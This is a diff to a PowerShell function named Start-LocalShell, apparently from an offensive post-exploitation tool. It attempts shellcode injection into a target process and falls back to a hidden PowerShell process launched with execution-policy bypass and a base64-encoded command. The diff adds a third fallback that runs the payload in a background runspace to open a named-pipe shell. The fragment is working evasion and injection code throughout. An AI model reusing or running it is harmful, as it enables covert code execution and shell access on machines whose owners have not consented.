@@ -2527,14 +2527,27 @@ function Start-LocalShell {
                 $_injOk = $_alMig.GetType("$_alNs.$_alInj").GetMethod("InjectShellcode").Invoke($null, @([int]$targetPid, [byte[]]$scBytes))
             } catch {}
             if (-not $_injOk) {
-                Write-Host " [!] Injection failed (no SeDebugPrivilege?) — spawning hidden PS process instead." -ForegroundColor Yellow
+                Write-Host " [!] Injection failed — trying hidden PS process..." -ForegroundColor Yellow
+                $_spawnOk = $false
                 try {
                     $b64enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($built.RawScript))
                     $psi_mg = New-Object System.Diagnostics.ProcessStartInfo('powershell.exe', "-ep bypass -nop -w hidden -enc $b64enc")
                     $psi_mg.CreateNoWindow = $true
                     $psi_mg.UseShellExecute = $false
                     [System.Diagnostics.Process]::Start($psi_mg) | Out-Null
-                } catch { Write-Host " [!] Spawn failed: $($_.Exception.Message)" -ForegroundColor Red }
+                    $_spawnOk = $true
+                } catch {}
+                if (-not $_spawnOk) {
+                    Write-Host " [!] Process spawn denied — starting pipe server in background runspace." -ForegroundColor Yellow
+                    try {
+                        $_mgRs = [RunspaceFactory]::CreateRunspace()
+                        $_mgRs.Open()
+                        $_mgPs = [PowerShell]::Create()
+                        $_mgPs.Runspace = $_mgRs
+                        $_mgPs.AddScript($built.RawScript) | Out-Null
+                        $_mgPs.BeginInvoke() | Out-Null
+                    } catch { Write-Host " [!] Runspace failed: $($_.Exception.Message)" -ForegroundColor Red }
+                }
             }
             Write-Host " [+] Connecting to pipe $PN (15s timeout)..." -ForegroundColor Green
             Start-Sleep -Seconds 2
